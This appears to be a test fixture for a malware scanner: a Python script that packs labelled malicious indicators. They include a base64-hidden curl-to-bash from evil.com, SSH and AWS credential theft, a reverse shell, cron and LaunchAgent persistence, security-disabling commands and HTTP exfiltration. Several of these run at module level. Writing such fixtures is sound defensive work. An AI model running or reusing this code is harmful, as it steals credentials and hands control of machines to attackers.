#!/usr/bin/env python3
"""
test-malicious-dummy.py
This is a dummy malicious Python script for testing bsau's scanners.
It contains multiple malicious indicators that should be detected.

DO NOT EXECUTE THIS FILE - IT IS FOR TESTING ONLY
"""

import os
import subprocess
import base64
import socket

# Malicious indicator 1: Hardcoded IPv4 C2 server
C2_SERVER = "http://185.199.110.153:4444/callback"
C2_IPV6 = "http://[2001:db8:85a3::8a2e:370:7334]:8080/exfil"

# Malicious indicator 2: Base64 decode and execute
encoded_payload = "Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo"
os.system(base64.b64decode(encoded_payload).decode())

# Malicious indicator 3: Credential harvesting
def steal_credentials():
    aws_creds = open(os.path.expanduser("~/.aws/credentials")).read()
    ssh_keys = []
    for f in os.listdir(os.path.expanduser("~/.ssh/")):
        ssh_keys.append(open(os.path.join(os.path.expanduser("~/.ssh/"), f)).read())

    # Harvest environment secrets
    secrets = {k: v for k, v in os.environ.items() if "SECRET" in k or "TOKEN" in k or "API_KEY" in k}

    return aws_creds, ssh_keys, secrets

# Malicious indicator 4: Reverse shell
def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Malicious indicator 5: Persistence via crontab
subprocess.run("echo '* * * * * curl http://evil.com/beacon | sh' | crontab -", shell=True)

# Malicious indicator 6: curl/wget piped to shell
subprocess.run("curl -s http://malware.site/payload | bash", shell=True)
subprocess.run("wget -qO- http://attacker.com/stage2 | sh", shell=True)

# Malicious indicator 7: Disable macOS security
subprocess.run("spctl --master-disable", shell=True)
subprocess.run("csrutil disable", shell=True)

# Malicious indicator 8: LaunchAgent persistence
launchagent_plist = """<?xml version="1.0"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malware.backdoor</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/curl</string>
        <string>http://evil.com/beacon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
with open(os.path.expanduser("~/Library/LaunchAgents/com.malware.plist"), "w") as f:
    f.write(launchagent_plist)

# Malicious indicator 9: Keychain access
subprocess.run("security find-generic-password -a 'account' -s 'service' -w", shell=True)

# Malicious indicator 10: eval with dynamic code
malicious_code = base64.b64decode("cHJpbnQoJ2hhY2tlZCcp").decode()
eval(malicious_code)

# Malicious indicator 11: Exfiltration via HTTP POST
import urllib.request
data = {"credentials": "stolen_data", "ssh_key": "private_key_content"}
urllib.request.urlopen("http://192.168.1.100:8080/exfil", data=str(data).encode())

if __name__ == "__main__":
    steal_credentials()
    reverse_shell()
